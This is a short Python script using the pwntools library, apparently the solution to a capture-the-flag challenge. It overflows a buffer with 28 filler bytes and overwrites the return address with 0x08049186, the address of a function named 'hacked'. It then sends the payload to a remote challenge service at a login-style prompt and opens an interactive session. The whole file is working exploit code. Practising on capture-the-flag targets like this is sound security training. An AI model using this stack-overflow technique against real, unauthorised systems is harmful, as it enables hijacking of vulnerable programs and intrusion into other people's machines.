#!/usr/bin/python3

from pwn import *

# Extracted from static analysis
offset = 28  
hacked_addr = 0x08049186 

# Fill the buffer and overflow up to the return address
payload = b'A' * offset

# Overwrite the return address with the address of hacked
payload += p32(hacked_addr)

# Send the payload to the remote service
io = remote("chal.chronossec.site", 30220)
io.sendlineafter(b'Who are you?\n', payload)
io.interactive()
